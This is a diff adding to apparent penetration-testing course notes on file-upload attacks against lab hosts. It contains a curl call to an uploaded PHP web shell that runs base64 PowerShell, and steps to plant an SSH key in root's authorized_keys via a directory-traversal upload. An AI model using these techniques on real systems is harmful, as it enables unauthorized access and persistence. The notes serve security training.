@@ -190,12 +190,43 @@ send curl request to simple-backdoor which takes a a command
 
 curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20SOMEBASE64PAYLOAD
 powershell -enc: allows powershell to parse base64 payloads
+
+### 9.3.2 Using Non-Executable Files
+if a file upload is not executable, another vuln like directory traversal much be used
+
+Always try uploading files that already exist! If already exists, use this to brute force contents of web server. If there is an error, there may be info on framework being used (e.g. php or something)
+
+If directory traversal exists, try to over-write files
+
+authorized_keys ssa overwrite
+1) generate an authorized_keys file
+ssh-keygen
+name: fileup
+this creates two files. A private key called fileup and a pubic key called fileup.pub
+cat fileup.pub > authorized_keys
+authorized keys has our public key... so now if we overwrite the targets authorized key we will be able to authenticate with fileup
+
+2) upload to ../../../../../../../root/.ssh/authorized_keys
+NOTE: often the root user does not carry SSH access permissions. Good to check though if you do not know any other users
+
+This may be useful to clear out previous connections to a host (or in our case connecting to the same mountaindesserts hostname but with 10 different ips throughout the course)
+rm ~/.ssh/known_hosts
+
+3) connect with SSA Key
+ssh -p 2222 -i fileup root@mountaindesserts.com
+
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
 Extra Reading   
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
+### 9.3.2 Using Non-Executable Files
+https://en.wikipedia.org/wiki/Google_Drive
+https://docs.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities
+https://docs.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools
+https://en.wikipedia.org/wiki/Ssh-keygen
+
 9.3.1. Using Executable Files
 https://en.wikipedia.org/wiki/Content_management_system
 https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/file-upload/alt-extensions-php.txt
